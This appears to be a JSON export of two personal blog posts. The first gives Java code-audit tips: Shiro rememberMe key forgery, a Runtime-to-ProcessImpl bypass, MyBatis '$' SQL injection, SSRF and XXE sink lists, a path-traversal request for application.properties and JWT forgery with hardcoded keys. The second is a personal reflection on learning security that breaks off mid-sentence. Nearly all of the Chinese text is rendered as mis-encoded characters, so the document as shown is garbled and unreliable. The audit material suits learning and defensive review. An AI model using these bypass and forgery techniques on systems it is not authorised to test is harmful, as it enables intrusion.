[{"title":"javaä»£ç å®¡è®¡çš„ä¸€äº›å°æŠ€å·§","path":"/2025/10/30/javaä»£ç å®¡è®¡çš„ä¸€äº›å°æŠ€å·§/","content":"ä¿¡æ¯æ”¶é›†å½“æ‹¿åˆ°ä¸€ä¸ªjavaé¡¹ç›®ä¹‹åï¼Œå…ˆè¿›è¡Œä¸€ä¸ªç®€å•çš„ä¿¡æ¯æ”¶é›†ï¼Œçœ‹çœ‹ç½‘ä¸Šæœ‰æ²¡æœ‰ç›¸å…³çš„æ–‡ç« æ¥ä»‹ç»è¿™ä¸ªé¡¹ç›®ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”å¦‚æœè¯´åœ¨æˆ‘å®¡è®¡çš„è¿™ä¸ªç‰ˆæœ¬ä¹‹å‰è¿˜æœ‰å¤šä¸ªç‰ˆæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä¼šå…ˆæ”¶é›†ä¸€ä¸‹è¯¥é¡¹ç›®çš„å†å²æ¼æ´å’Œcveï¼Œå¯¹è¿™äº›æ´è¿›è¡Œä¸€ä¸ªåŸºç¡€çš„äº†è§£ï¼Œå› ä¸ºæœ‰çš„æƒ…å†µä¸‹åç»­ç‰ˆæœ¬å¯¹äºè¿™äº›æ¼æ´æ‰“çš„è¡¥ä¸å¹¶ä¸å½»åº•å…¨é¢ï¼Œè¿˜æ˜¯å¯ä»¥è¿›è¡Œä¸€ä¸ªç»•è¿‡å¤„ç†çš„ï¼Œç„¶åæŒ‰ç€å‰é¢å·²ç»çˆ†å‡ºæ¥çš„æ´çš„æ€è·¯æ¥è¿›è¡Œå®¡è®¡æœ‰æ—¶å€™ä¹Ÿä¼šæ„å¤–ä¹‹å–œ ç„¶åäº†è§£é¡¹ç›®çš„åˆ†å±‚æ¶æ„ï¼ˆå¦‚Controllerå±‚ã€Serviceå±‚ã€DAOå±‚ï¼‰å’Œé‡‡ç”¨çš„MVCæ¡†æ¶ï¼ˆSpring MVC, Struts2ç­‰ï¼‰ åœ¨è¿›è¡Œé¡¹ç›®ç¯å¢ƒæ­å»ºäº†ä¹‹åï¼ˆå¾€å¾€æ¥è¯´è¿™æ­¥ä¼šé‡åˆ°æŒºå¤šé—®é¢˜çš„ï¼‰ï¼Œæˆ‘ä¼šå…ˆçœ‹pom.xmlæ–‡ä»¶ï¼Œä¸»è¦å…³æ³¨é¡¹ç›®ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“ã€ä¸­é—´ä»¶åŠå…¶ç‰ˆæœ¬ï¼Œé‡ç‚¹æ’æŸ¥æ˜¯å¦æœ‰å·²çŸ¥å…¬å¼€æ¼æ´çš„ç»„ä»¶ï¼Œçœ‹çœ‹ä½¿ç”¨çš„ä¾èµ–ï¼Œæ˜¯å¦æ˜¯å¯ä»¥è¿›è¡Œååºåˆ—æ”»å‡»çš„ç›¸å…³ä¾èµ–ï¼Œæ¯”å¦‚ccã€fastjsonã€shiroç­‰ å†æŸ¥çœ‹web.xmlã€æ¡†æ¶é…ç½®æ–‡ä»¶ç­‰ï¼Œäº†è§£URLæ˜ å°„ã€è¿‡æ»¤å™¨(Filter)é“¾ã€æƒé™æ§åˆ¶é…ç½®ç­‰å…¨å±€è®¾ç½®ï¼ŒæŸ¥çœ‹è¿™äº›ä¸»è¦æ˜¯ä¸ºäº†åé¢å¯èƒ½å­˜åœ¨çš„è¶Šæƒæ¼æ´ ç¬¬äºŒæ­¥å¯¹äºæˆ‘è‡ªå·±æ¥è¯´ï¼Œæˆ‘ä¸€èˆ¬æ˜¯é‡‡å–é»‘ç™½ç»“åˆçš„æ–¹å¼æ¥å¯¹é¡¹ç›®è¿›è¡Œå®¡è®¡ ä»å…¥å£ç‚¹åˆ°æ¼æ´å¼€å§‹æˆ‘ä¼šå¯¹æ•´ä¸ªé¡¹ç›®è¿›è¡Œä¸€ä¸ªç®€å•çš„é»‘ç›’æµ‹è¯•ï¼Œä¸»è¦ç›®çš„æ˜¯äº†è§£è¯¥é¡¹ç›®æ€»çš„å„ç§åŠŸèƒ½ç‚¹ï¼Œçœ‹çœ‹å“ªäº›æ˜¯æ¯”è¾ƒå¯èƒ½å­˜åœ¨æ¼æ´çš„ï¼Œéœ€è¦é‡ç‚¹å…³æ³¨çš„ï¼Œç„¶åå¯¹è¿™äº›åŠŸèƒ½ç‚¹ç›¸å…³çš„ä»£ç è¿›è¡Œæµ‹è¯•å®¡è®¡ æ¯”å¦‚è¯´é‡åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œå¼€å§‹debugï¼Œè·Ÿè¸ªè¾“å…¥çš„æ•°æ®åœ¨ä»£ç ä¸­çš„å®Œæ•´ä¼ é€’è·¯å¾„ï¼Œåˆ†ææ•°æ®ç»è¿‡äº†å“ªäº›å¤„ç†ï¼ˆå¦‚è¿‡æ»¤ã€æ ¡éªŒã€æ‹¼æ¥ï¼‰ï¼Œç›´åˆ°æœ€ç»ˆè¢«ä½¿ç”¨ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¯¹æ‰€ç»è¿‡çš„ä»£ç ç‰‡æ®µè¿›è¡Œä¸€ä¸ªå®¡è®¡ï¼Œçœ‹æ˜¯å¦æœ‰ä½¿ç”¨ä¸€äº›å±é™©å‡½æ•°ï¼Œå¯¹äºæ–‡ä»¶ååŠå­˜å‚¨è·¯å¾„æ˜¯å¦åšäº†å®Œæ•´çš„è¿‡æ»¤æ£€æµ‹ï¼Œé‚£äº›æ ¡éªŒçš„è¿‡ç¨‹æ˜¯å¦å¯ä»¥ç»•è¿‡ï¼ŒåŠ å¯†çš„è¿‡ç¨‹æ˜¯å¦å¯ä»¥è¿›è¡Œç ´è§£çš„ç­‰ç­‰ è¿™é‡Œå†é‡ç‚¹æä¸€ä¸‹ååºåˆ—åŒ–ç›¸å…³çš„æ¼æ´ï¼Œæ¯”å¦‚è¯´çœ‹åˆ°cookieé‡Œé¢æœ‰ä¸€ä¸ªremembermeå­—æ®µï¼Œé‚£ä¹ˆè‚¯å®šå°±æ˜¯æœ‰shiroä¾èµ–ï¼Œè¿™æ—¶å€™è·Ÿä¸€ä¸‹æ•°æ®æµï¼Œçœ‹æ˜¯å¦æ˜¯å¯¹ç§°åŠ å¯†ï¼Œå¯†é’¥æ˜¯ä¸æ˜¯ç¡¬ç¼–ç ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥è‡ªå·±æ¥ä¼ªé€ åŠ å¯†è¿‡ç¨‹ï¼Œæ˜¯å¦æœ‰é™åˆ¶äº†ä¸€äº›å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚ç¦æ‰äº†Runtimeï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥ä½¿ç”¨æ›´åº•å±‚çš„ä¸€ä¸ªç±»ProcessImplæ¥è¿›è¡Œç»•è¿‡ ç›¸å…³çš„è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº† ä»ä»£ç å±‚åˆ°å…¥å£ç‚¹è¿™é‡Œå°±æ˜¯ç›´æ¥å¼€å§‹ç™½ç›’å®¡è®¡ï¼Œè¦æ˜¯åœ¨æ—¶é—´å……è¶³ï¼Œä»£ç é‡ä¸å¤šçš„æƒ…å†µä¸‹å¯ä»¥é€‰æ‹©æŠŠæ‰€æœ‰ä»£ç éƒ½çœ‹ä¸€éï¼Œè¿™æ ·å°±å•¥éƒ½ä¸ä¼šæ¼æ‰äº† ä½†æ˜¯è¿™é‡Œæˆ‘ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯é€šè¿‡å…³é”®è¯æ¥è¿›è¡Œå®šä½ä»£ç ç‰‡æ®µï¼Œå¯»æ‰¾æ¼æ´ å¯¹äºsqlæ³¨å…¥æ¥è®²ï¼Œåªè¦æ˜¯ä¸æ•°æ®åº“å­˜åœ¨äº¤äº’çš„åœ°æ–¹ï¼Œåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œéƒ½æœ‰å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´ æ¯”å¦‚è¯´å‘ç°æ‰€ç”¨çš„æ•°æ®åº“æ˜¯mybatisï¼Œé‚£ä¹ˆå¯ä»¥æœç´¢å…³é”®è¯$æ¥è¿›è¡Œå®šä½ï¼Œå› ä¸ºå¯¹äºmybatisæ¥è¯´æœ‰é¢„ç¼–è¯‘çš„è¯ï¼Œé‚£ä¹ˆä¼šä½¿ç”¨#æ¥å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°æ®è¿›è¡ŒåŒ…æ‹¬ï¼Œåœ¨è¿™æƒ…å†µä¸‹å°±ä¸éœ€è¦è€ƒè™‘sqlæ³¨å…¥æ¼æ´ Select * from news where title like â€˜%$title%â€™ ä½†æ˜¯åœ¨sqlè¯­å¥çš„ä¸€äº›åœ°æ–¹æ˜¯ä¸èƒ½å¤Ÿä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥æ¥è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚order byã€group byè¿™äº›å…³é”®å­—ï¼Œå¯ä»¥å†é…åˆ+è¿™ä¸ªç¬¦å·æ¥è¿›è¡Œä¸€ä¸ªå®šä½ Select * from news where title =â€˜javaâ€™ order by $time asc å®šä½åˆ°äº†æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„sqlè¯­å¥åå¹¶æ²¡æœ‰ç»“æŸï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦è·Ÿç€è¯¥sqlè¯­å¥å¾€ä¸Šèµ°ï¼Œèµ°åˆ°å…¥å£ç‚¹ï¼Œæ£€æŸ¥åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æœ‰æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°æ®è¿›è¡Œä¸€ä¸ªæ£€æµ‹ï¼Œæ˜¯å¦æœ‰å¯¹ä¸€äº›sqlæ³¨å…¥å¸¸ç”¨çš„å‡½æ•°è¿›è¡Œä¸€ä¸ªè¿‡æ»¤ï¼Œå³ä½¿æœ‰çš„è¯ä¹Ÿå¯ä»¥å°è¯•ä¸€æ‰‹èƒ½ä¸èƒ½è¿›è¡Œä¸€ä¸ªç»•è¿‡ å¯¹äºssrfæ¼æ´æ¥è¯´ï¼Œä»£ç ä¸­æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä½†æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶çš„è¯å°±æœ‰å¯èƒ½å­˜åœ¨è¯¥æ¼æ´ï¼Œç®€å•æ¥è¯´å°±æ˜¯åªè¦æ˜¯èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹ï¼Œå°±æœ‰å¯èƒ½ä¼šå‡ºç°SSRFæ¼æ´ã€‚å¯ä»¥é‡ç‚¹æŸ¥æ‰¾ä»¥ä¸‹å‡½æ•° HttpClient.executeHttpClient.executeMethodHttpURLConnection.connectHttpURLConnection.getInputStreamURL.openStream å¯¹äºXXEæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å…¨å±€æœç´¢æ¥å£å…³é”®è¯ åŸç”Ÿ javax.xml.parsers.DocumentBuilderFactory å…³é”®è¯ï¼šDocumentBuilderFactory.newInstance();javax.xml.parsers.SAXParserFactory å…³é”®è¯ï¼šSAXParserFactory.newInstance();javax.xml.transform.TransformerFactory å…³é”®è¯ï¼šTransformerFactory.newInstance();javax.xml.validation.SchemaFactory å…³é”®è¯ï¼šSchemaFactory.newInstance(javax.xml.bind.JAXBContext å…³é”®è¯ï¼šJAXBContext.newInstance(javax.xml.stream.XMLStreamReader å…³é”®è¯ï¼šXMLInputFactory.newInstance(); ç¬¬ä¸‰æ–¹ Dom4j å…³é”®è¯ï¼šnew SAXReader();JDOM å…³é”®è¯ï¼šnew SAXBuilder();Apache Commons Digester å…³é”®è¯ï¼šnew Digester();XStream å…³é”®è¯ï¼šnew XStream(... å¯¹äºxxeæ¼æ´çš„é˜²èŒƒå¯ä»¥è¯´æ˜¯æœ€ç®€å•çš„ï¼Œå°±æ˜¯ç›´æ¥ç¦æ­¢å¤–éƒ¨å®ä½“æ³¨å…¥å°±å¯ä»¥äº† ç›¸å…³çš„è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº† æœ€åä¸€æ­¥æœ€åä¸€æ­¥ä¹Ÿæ˜¯æˆ‘è®¤ä¸ºçš„æœ€é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œé‚£å°±æ˜¯ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼Œå¦‚ç”¨æˆ·æ³¨å†Œç™»å½•å¯†ç æ‰¾å›ã€æƒé™ç®¡ç†ï¼ˆè¶Šæƒè®¿é—®ï¼‰ã€æ”¯ä»˜æµç¨‹ã€æ•°æ®å½’å±ç­‰ï¼Œè¿™ç§ç±»å‹çš„æ¼æ´ä¸€èˆ¬æ¥è¯´æ¯”è¾ƒéš¾é€šè¿‡å·¥å…·æ‰«æå‘ç°ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å¯¹ç›¸å…³çš„æµç¨‹ã€ä»£ç æœ‰æ¯”è¾ƒæ·±çš„è®¤è¯† æ¯”å¦‚è¯´æ”¯ä»˜æ¼æ´ï¼Œä¹‹å‰æˆ‘æœ‰é‡åˆ°ä¸€é“ctfé¢˜ç›®çš„æ—¶å€™ï¼Œé‚£é“é¢˜éœ€è¦å¤§é‡çš„è™šæ‹Ÿè´§å¸æ¥è·å–åˆ°ä¸€ä¸ªvipæƒé™ï¼Œè€Œè·å–è™šæ‹Ÿè´§å¸çš„é€”å¾„æ˜¯ç­¾åˆ°ã€åšä»»åŠ¡æˆ–è€…æ˜¯æ°ªé‡‘ï¼Œå› ä¸ºé‚£é“é¢˜ç›®æœ‰æä¾›æºç ç»™æˆ‘ä»¬ä¸‹è½½ï¼Œæ‰€ä»¥æˆ‘å°±å¯¹ç€æºç è¿›è¡Œå®¡è®¡ï¼Œå‘ç°åœ¨å…¶å……å€¼åŠŸèƒ½å¤„å¹¶æ²¡æœ‰åšçš„å¾ˆå®‰å…¨ï¼Œé¡¹ç›®çš„å……å€¼æµç¨‹æ˜¯ä½ è¾“å…¥æ‰€éœ€è¦çš„é‡‘é¢å……å€¼å®Œæ¯•åï¼Œåç«¯ä¼šè‡ªåŠ¨è·³è½¬åˆ°ä¸€ä¸ªè·¯ç”±è¿›è¡Œå……å€¼æ˜¯å¦æˆåŠŸçš„ç¡®è®¤ï¼Œä½†æ˜¯è¯¥åŠŸèƒ½ç‚¹çš„ç¡®è®¤å‚æ•°åªæœ‰è´¦å·idã€ç™»é™†å‡­è¯ã€å……å€¼æ•°é¢ä»¥åŠä¸€ä¸ªå……å€¼æ˜¯å¦æˆåŠŸçš„å¸ƒå°”å€¼ï¼Œè¿™äº›å‚æ•°éƒ½æ˜¯é€šè¿‡jsonè¿›è¡Œä¼ è¾“ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œä»»æ„æ›´æ”¹ï¼Œäºæ˜¯æˆ‘ä»¬å°±è¾¾åˆ°äº†ä¸éœ€è¦çœŸæ­£çš„å……å€¼ä½†æ˜¯ä¹Ÿèƒ½è·å–åˆ°å¤§é‡è™šæ‹Ÿè´§å¸çš„æ•ˆæœ åœ¨ä¸šåŠ¡é€»è¾‘ä¸­ï¼Œæˆ‘è§‰å¾—çœŸæ­£çš„é‡å¤´æˆæ˜¯æƒé™ç®¡ç†ï¼ˆè¶Šæƒè®¿é—®ï¼‰ï¼Œè¿™ç§æ¼æ´é€ æˆçš„å±å®³ç›¸å¯¹æ¥è¯´æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œæˆ‘ä¸‹é¢ä¼šæ¯”è¾ƒè¯¦ç»†åœ°è®²ä¸€è®² åœ¨javaä¸­ï¼Œé€šå¸¸æ˜¯é€šè¿‡filterå’Œinterceptoræ¥è¿›è¡Œä¸€ä¸ªæƒé™çš„æ§åˆ¶ æˆ‘ä»¬é¦–å…ˆéœ€è¦åšçš„å°±æ˜¯æŸ¥çœ‹è¿‡æ»¤å™¨æ˜¯å¦æ˜¯å¯¹æ ¹è·¯å¾„åŠä»¥ä¸‹æ‰€æœ‰å­è·¯å¾„éƒ½è¿›è¡Œäº†ä¸€ä¸ªæƒé™ç®¡ç†ï¼Œå¦‚æœæ˜¯ä»…å¯¹ç®¡ç†å‘˜çš„åŠŸèƒ½ç‚¹è¿›è¡Œä¸€ä¸ªæƒé™çš„é™åˆ¶çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¼€å§‹å®¡è®¡çœ‹æ™®é€šç”¨æˆ·ä¹‹é—´æ˜¯å¦å­˜åœ¨æ°´å¹³è¶Šæƒï¼Œç®¡ç†å‘˜çš„æ‰€æœ‰åŠŸèƒ½ç‚¹æ˜¯å¦éƒ½åšäº†æƒé™æ ¡éªŒï¼Œå› ä¸ºæœ‰çš„å¼€å‘è€…ä¼šæ¯”è¾ƒç²—å¿ƒï¼Œå¯¹ç®¡ç†å‘˜çš„å¤§éƒ¨åˆ†åŠŸèƒ½ç‚¹éƒ½è¿›è¡Œäº†æ ¡éªŒï¼Œä½†æ˜¯æ¼æ‰äº†å°‘æ•°å‡ ä¸ªï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¿›è¡Œå‚ç›´è¶Šæƒæ“ä½œ æ¥ç€æˆ‘ä»¬å®¡è®¡è¿‡æ»¤å™¨å…·ä½“é€»è¾‘ï¼Œçœ‹æ˜¯å¦å­˜åœ¨è·¯å¾„ç©¿è¶Šå¯¼è‡´æœªæˆæƒè®¿é—®æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡ŒåŠŸèƒ½çš„æ¼æ´ï¼Œå…·ä½“æ˜¯æ€ä¹ˆæ“ä½œçš„å‘¢ï¼Œæˆ‘ä»¬é‡ç‚¹è¦å…³æ³¨request.getRequestURL()å’Œequest.getRequestURI()æ–¹æ³•ï¼Œå› ä¸ºåœ¨tomcatä¸­URLè§£ææ˜¯æ”¯æŒåµŒå…¥./ã€../ã€;xx/ç­‰ç‰¹æ®Šå­—ç¬¦çš„ï¼Œè€Œè¿™ä¸¤ä¸ªå‡½æ•°è§£ææå–çš„URLå†…å®¹æ˜¯åŒ…å«æˆ‘ä»¬åµŒå…¥çš„ç‰¹æ®Šå­—ç¬¦çš„ï¼Œå› æ­¤å½“ä½¿ç”¨ä¸å½“æ—¶ä¼šå­˜åœ¨å®‰å…¨é—®é¢˜å¦‚ç»•è¿‡è®¤è¯ å½“ç„¶å¦‚æœåªæ˜¯ç®€å•çš„é€šè¿‡é»‘åå•æ¥ç¦æ­¢è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦çš„è¯è¿˜å¯ä»¥é€šè¿‡urlç¼–ç æ¥è¿›è¡Œç»•è¿‡ ä½†æ˜¯åœ¨ä¸Šé¢è¿™æ­¥å…·ä½“å®æ–½ä¹‹å‰ï¼Œè¿˜éœ€è¦å…ˆåšä¸€æ­¥ï¼Œé‚£å°±æ˜¯æŸ¥çœ‹ä¸€ä¸‹springbootçš„ç‰ˆæœ¬ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ Spring Boot 2.5.0 å¼€å§‹ï¼Œå®˜æ–¹å¼•å…¥äº†ä¸€ä¸ªå®‰å…¨æ€§ä¿®å¤ï¼š ç¦æ­¢å¯¹é™æ€èµ„æºè·¯å¾„è¿›è¡Œ ..ï¼ˆç›®å½•ç©¿è¶Šï¼‰è§£æã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ è®¿é—®ç±»ä¼¼ï¼š http://localhost:8080/../../application.properties åœ¨ Spring Boot 2.4.x åŠä¹‹å‰ï¼Œå¯èƒ½ä¼šè¢« TomcatWebFlux çš„é™æ€èµ„æºè§£æå™¨å¤„ç†ï¼ˆå…·ä½“è¡Œä¸ºä¾èµ–é…ç½®ï¼Œæœ‰äº›æƒ…å†µä¸‹èƒ½â€œé€ƒé€¸â€åˆ°èµ„æºç›®å½•å¤–ï¼‰ã€‚ä» Spring Boot 2.5.0 èµ·ï¼Œè¿™ä¸ªè¢«ç›´æ¥æ‹¦æˆªï¼Œè¿”å› 400 æˆ– 404 æœ€åå‘¢æˆ‘ä»¬è¦æŸ¥ä»£ç ä¸­çš„ç™»é™†å‡­è¯çš„åŠ å¯†é€»è¾‘å’Œæ£€æµ‹é€»è¾‘ï¼Œçœ‹çœ‹æ£€æµ‹é€»è¾‘æ˜¯å¦å¯ä»¥ç»•è¿‡ï¼ŒåŠ å¯†è¿‡ç¨‹æ˜¯å¦å¯æ§ç­‰ç­‰ï¼Œæ¯”å¦‚è¯´ä¸€ä¸ªé¡¹ç›®é‡‡ç”¨çš„æ˜¯JWTåŠ å¯†è®¤è¯æ–¹å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ£€æŸ¥å…¶é‡‡å–çš„åŠ å¯†æ–¹æ³•ï¼Œæ˜¯å¯¹ç§°åŠ å¯†è¿˜æ˜¯éå¯¹ç§°åŠ å¯†ï¼Œç„¶åå†ä¸€æ­¥æ­¥è·Ÿè¿›åŠ å¯†ä»£ç é€»è¾‘ï¼Œçœ‹åŠ å¯†æ‰€é‡‡ç”¨çš„å¯†é’¥æ˜¯å¦æ˜¯ç¡¬ç¼–ç ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥è‡ªå·±ä¼ªé€ å‡ºæ¥ï¼Œä»è€Œæ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ç™»å½•å‡­è¯ï¼Œå®ç°è¶Šæƒ è¡¥å……ä¸Šè¿°å†…å®¹å°±æ˜¯æˆ‘å¹³å¸¸è¿›è¡Œä»£ç å®¡è®¡çš„æ—¶å€™æ‰€é‡‡å–çš„æ€è·¯å’Œä¸€äº›å°æŠ€å·§ï¼Œç›®å‰çš„è¯æˆ‘æ„Ÿè§‰çº¯æ‰‹å®¡è¿˜æ˜¯å¤ªç´¯äº†ä¸€ç‚¹ï¼Œæ‰“ç®—è¯•ç€è”åˆcodeqlæ¥ç®€åŒ–ä¸€äº›å®¡è®¡çš„æ­¥éª¤ï¼Œæ¯”å¦‚æå‰å†™å¥½æ£€æµ‹mysqlæ¼æ´çš„qlè„šæœ¬ï¼Œç„¶åæŠŠé¡¹ç›®ç¼–è¯‘æˆqlæ•°æ®åº“æ‹¿å»è·‘ä¸€ä¸‹ï¼Œæˆ–è€…æ˜¯åˆ©ç”¨ç½‘ä¸Šç°æˆçš„fortifyå·¥å…·æ¥ç¼©çŸ­å®¡è®¡çš„æ—¶é—´ï¼Œç›®å‰è¿™ä¸¤ç§æ–¹æ³•è¿˜åœ¨ç†è®ºé˜¶æ®µï¼Œå°šæœªè¿›è¡Œæµ‹è¯•ï¼Œæ¬¢è¿å„ä½å¸ˆå‚…æ¥å’Œæˆ‘æ²Ÿé€šäº¤æµï¼ŒæŒ‡å¯¼ä¸€ä¸‹æˆ‘"},{"title":"é¢è¯•å°ç»“","path":"/2025/10/22/é¢è¯•å°ç»“/","content":"å‰è¨€å‹æƒ…æé†’ï¼Œæœ¬ç¯‡æ–‡ç« æ— ä»»ä½•å¹²è´§ï¼Œçº¯ç²¹æ˜¯å¯¹è‡ªå·±è¿‡å»ä¸¤å¹´ç½‘å®‰å­¦ä¹ çš„ä¸€ä¸ªå°æ€»ç»“ æ­£æ–‡2025å¹´10æœˆ22æ—¥ï¼Œè¿™å¤©åˆšåšå®Œå®ä¹ å‰çš„ä½“æ£€å’ŒåŠå·¥èµ„å¡ï¼Œæ™šä¸Šä¸æƒ³å­¦ä¹ å°±æƒ³ç€ä¹Ÿæ¥å†™å†™è‡ªå·±çš„ä¸€ç‚¹å°æ„Ÿæ‚Ÿ è¿›å…¥ç½‘å®‰ä¸¤å¹´å¤šä¸€ç‚¹äº†ï¼Œè¿˜è®°å¾—åˆšåˆšå…¥å­¦çœ¼å‰æ˜¯ä¸€ç‰‡èŒ«ç„¶ï¼ŒåªçŸ¥é“è·Ÿç€å­¦æ ¡æ¥å­¦ï¼Œç›´åˆ°ä»åŒå­¦å£ä¸­å¾—çŸ¥æœ‰ä½22çº§çš„å­¦é•¿ï¼Œæ˜¯æ ¡ä¿¡æ¯å®‰å…¨å›¢é˜Ÿçš„ï¼Œåœ¨ç¾¤é‡Œå¾ˆæ´»è·ƒï¼Œä¹Ÿæ„¿æ„æŒ‡ç‚¹ä¸€ä¸‹æˆ‘ä»¬ï¼Œäºæ˜¯é¼“èµ·å‹‡æ°”å»åŠ äº†ä»– ä»æ­¤ï¼Œæˆ‘æ­£å¼å¼€å§‹äº†ç½‘å®‰ç”Ÿæ´»ï¼Œæœ€å¼€å§‹çš„htmlå­¦ä¹ éƒ½è®©æˆ‘å€æ„Ÿè‰°éš¾ï¼ˆæ¯•ç«Ÿæˆ‘ä¸Šå¤§å­¦å‰åŸºæœ¬æ²¡ç¢°è¿‡ç”µè„‘ æ…¢æ…¢çš„ï¼Œæˆ‘å¼€å§‹é€‚åº”äº†ï¼Œå¼€å§‹æ¥è§¦äº†æ¼æ´ï¼Œsqlæ³¨å…¥ã€æ–‡ä»¶åŒ…å«â€¦â€¦ï¼Œso muchï¼Œæˆ‘å¯¹ç½‘å®‰ä¹Ÿé€æ¸çƒ­çˆ±äº†èµ·æ¥ å†¬ä»¤è¥ã€å¤ä»¤è¥ï¼Œç»è¿‡å·®ä¸å¤šä¸€å¹´çš„å­¦ä¹ ï¼Œæˆ‘ä¹ŸæˆåŠŸåŠ å…¥äº†è¯¥å›¢é˜Ÿï¼Œé‚£æ—¶çš„æˆ‘å€æ„Ÿé«˜å…´ å¤ä»¤è¥ååŠæ®µæ—¶é—´ï¼Œæˆ‘é€‰æ‹©äº†ä»£ç å®¡è®¡æ–¹å‘ï¼Œäºæ˜¯å¼€å§‹å­¦ä¹ javaï¼Œå³ç›¸å…³çš„ååºåˆ—åŒ–æ¼æ´ï¼Œå†…å­˜é©¬ï¼ˆå½“æ—¶æˆ‘ä¹Ÿä¸æ¸…æ¥šè¿™ä¸¤ä¸ªä¸€å­¦å°±ä»9æœˆä»½å­¦åˆ°äº†æ¥å¹´çš„äº”æœˆåˆï¼‰ï¼Œåæœˆæœ«äº²çœ¼çœ‹ç€å­¦é•¿lmé¢è¯•æˆåŠŸï¼Œæˆ‘ä¹Ÿç«‹ä¸‹äº†è¦å»é‚£å®¶å…¬å¸å®ä¹ çš„ç›®æ ‡ ä»Šå¹´çš„äºŒæœˆä¸­æ—¬ï¼Œæ–°å¹´åˆšè¿‡çš„é‚£æ®µæ—¶é—´ï¼Œåˆ°ä¸‰æœˆä¸­æ—¬ï¼Œæˆ‘åº¦è¿‡äº†ä¸€æ®µè‡³ä»Šè¿˜è®°å¿†çŠ¹æ–°çš„æ—¶å…‰ï¼ˆè¯´å®è¯åº”è¯¥æ˜¯æœ‰ç‚¹å¿ƒç†åˆ›ä¼¤äº†ï¼‰ï¼Œé‚£æ®µæ—¶é—´æˆ‘æ˜¯å¿«ä¹çš„ï¼Œä½†é‚£æ®µæ—¶é—´æˆ‘ä¹Ÿæ˜¯å •è½çš„ï¼Œä¸çŸ¥å­¦ä¹ ä¸ºä½•ç‰©ï¼Œæ²‰æººäºæ¸©æŸ”ä¹¡ä¹‹ä¸­ï¼Œä½†ä¹Ÿè¦æ„Ÿè°¢å¥¹å§ï¼Œæ²¡æœ‰æœ€åçš„æ”¾æ‰‹ï¼Œå“ªæ¥å¦‚ä»Šçš„æˆ‘ åˆè¿·å¤±äº†å·®ä¸å¤šä¸¤å‘¨åï¼Œä¸‰æœˆæœ«æˆ‘é‡æ•´æ——é¼“ï¼Œå¼€å§‹æ‹¾èµ·å‰é¢æˆ‘æ‰€ä¸¢æ‰çš„çŸ¥è¯†ï¼Œå¼€å§‹åº“åº“å­¦ï¼Œé‚£æ®µæ—¶é—´åº”è¯¥æ˜¯æˆ‘å­¦ä¹ æ•ˆç‡æœ€é«˜çš„ä¸€æ®µæ—¶é—´äº†ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ äº”æœˆåˆï¼Œåˆæ­¥å­¦å®Œjavaå†…å­˜é©¬åï¼Œæˆ‘å¼€å§‹åœ¨ç½‘ä¸Šæœç½—ç›¸å…³çš„ä»£ç å®¡è®¡æ–‡ç« ï¼Œè·Ÿç€æ–‡ç« ä¸€æ­¥æ­¥çš„å¤ç°æ¼æ´ï¼Œæ‰¾æ¼æ´ï¼Œæ€»ç»“åŸºæœ¬æŠ€å·§ã€‚è·Ÿç€å­¦çš„æ—¶å€™ï¼Œç¯å¢ƒæ­å»ºçš„æˆ‘è¦å¥”æºƒæ‰äº†ï¼Œå…­æœˆåˆçš„æ—¶å€™è‡ªå·±å¯¹ç€ä¸€ä¸ªé¡¹ç›®å®¡å‡ºäº†æŒºå¤šæ¼æ´ï¼Œéƒ½æ‹¿å»äº¤cveäº†ï¼ˆåé¢å‡ºç»“æœçš„æ—¶å€™è·Ÿæˆ‘å›çš„æ˜¯æ²¡æœ‰ç‰ˆæœ¬å·ä¿¡æ¯ï¼Œæ— 